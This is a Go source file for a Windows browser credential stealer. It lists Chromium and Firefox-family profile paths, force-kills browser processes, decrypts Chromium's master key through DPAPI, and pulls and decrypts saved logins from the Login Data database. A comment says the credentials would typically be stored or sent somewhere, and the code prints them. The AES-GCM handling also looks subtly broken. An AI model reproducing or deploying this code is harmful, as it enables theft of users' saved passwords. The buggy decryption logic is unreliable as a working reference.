package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/billgraziano/dpapi"
	_ "github.com/mattn/go-sqlite3"
)

var ChromiumBrowserPaths = map[string]string{
	"Chrome":      LocalAppDataPath + `\Google\Chrome\User Data`,
	"Edge":        LocalAppDataPath + `\Microsoft\Edge\User Data`,
	"Brave":       LocalAppDataPath + `\BraveSoftware\Brave-Browser\User Data`,
	"Yandex":      LocalAppDataPath + `\Yandex\YandexBrowser\User Data`,
	"Opera":       LocalAppDataPath + `\Opera Software\Opera Stable`,
	"Opera GX":    LocalAppDataPath + `\Opera Software\Opera GX Stable`,
	"Vivaldi":     LocalAppDataPath + `\Vivaldi\User Data`,
	"Amigo":       LocalAppDataPath + `\Amigo\User Data`,
	"Kometa":      LocalAppDataPath + `\Kometa\User Data`,
	"Orbitum":     LocalAppDataPath + `\Orbitum\User Data`,
	"CentBrowser": LocalAppDataPath + `\CentBrowser\User Data`,
	"CocCoc":      LocalAppDataPath + `\CocCoc\Browser\User Data`,
	"Sputnik":     LocalAppDataPath + `\Sputnik\Sputnik\User Data`,
	"7Star":       LocalAppDataPath + `\7Star\7Star\User Data`,
	"Iridium":     LocalAppDataPath + `\Iridium\User Data`,
}

var FirefoxPaths = map[string]string{
	"Firefox":     AppDataPath + `\Mozilla\Firefox\Profiles`,
	"Waterfox":    AppDataPath + `\Waterfox\Profiles`,
	"Thunderbird": AppDataPath + `\Thunderbird\Profiles`,
}

var BrowserProcesses = []string{
	"chrome", "msedge", "brave", "yandex", "opera", "vivaldi", "amigo", "kometa", "orbitum",
	"centbrowser", "coccoc", "sputnik", "7star", "iridium", "firefox", "waterfox", "thunderbird",
}

func killBrowserProcesses() error {
	running, err := exec.Command("tasklist").Output()
	if err != nil {
		return err
	}
	runningProcesses := strings.ToLower(string(running))

	for _, process := range BrowserProcesses {
		process = strings.ToLower(process) + ".exe"
		if !strings.Contains(runningProcesses, process) {
			continue
		}
		err := exec.Command("taskkill", "/F", "/IM", process).Run()
		if err != nil {
			// Ignore "process not found" errors
			if !strings.Contains(err.Error(), "exit status 128") {
				return err
			}
		}
	}
	return nil
}

type localState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func decryptKey(localStatePath string) ([]byte, error) {
	f, err := os.ReadFile(localStatePath)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return nil, nil
		}
		return nil, err
	}
	var jsonData localState
	_ = json.Unmarshal(f, &jsonData)
	if jsonData.OsCrypt.EncryptedKey == "" {
		return nil, nil
	}
	encryptedKey, err := base64.StdEncoding.DecodeString(jsonData.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if !strings.HasPrefix(string(encryptedKey), "DPAPI") {
		return nil, errors.New("unexpected key prefix")
	}
	encryptedKey = encryptedKey[5:]
	decryptedKey, err := dpapi.DecryptBytes(encryptedKey)
	if err != nil {
		return nil, err
	}
	return decryptedKey, nil
}

func decryptPassword(password []byte, encryptionKey []byte) ([]byte, error) {
	if len(password) > 31 {
		// Newer versions of Chromium use AES-GCM encryption with a DPAPI-wrapped key
		nonce := password[3:15]
		ciphertext := password[15 : len(password)-16]
		tag := ciphertext[len(password)-16:]

		ciphertext, err := base64.StdEncoding.DecodeString(string(ciphertext))
		if err != nil {
			return nil, fmt.Errorf("base64 decode: %w", err)
		}

		ciphertextAndTag := append(ciphertext, tag...)

		block, err := aes.NewCipher(encryptionKey)
		if err != nil {
			return nil, err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}

		plaintext, err := gcm.Open(nil, nonce, ciphertextAndTag, nil)
		if err != nil {
			return nil, err
		}
		return plaintext, nil
	}
	return nil, errors.New("unsupported encryption format")
}

func grabChromiumData(path string) {
	encryptionKey, err := decryptKey(path + `\Local State`)
	if err != nil || encryptionKey == nil {
		return
	}

	db, err := sql.Open("sqlite3", path+`\Default\Login Data`)
	if err != nil {
		log.Println(err)
		return
	}

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		log.Println(err)
		return
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
			continue
		}
		decryptedPassword, err := decryptPassword(encryptedPassword, encryptionKey)
		if err != nil {
			continue
		}
		if username != "" || len(decryptedPassword) > 0 {
			// Here you would typically store or send the credentials somewhere
			_ = url
			_ = username
			_ = decryptedPassword
			// For example:
			fmt.Printf("URL: %s\nUsername: %s\nPassword: %s\n\n", url, username, string(decryptedPassword))
		}
	}
}

func grabBrowsersData() {
	_ = killBrowserProcesses()

	for name, path := range ChromiumBrowserPaths {
		stat, err := os.Stat(path)
		if err != nil || !stat.IsDir() {
			continue
		}
		grabChromiumData(path)
		_ = name
	}
}
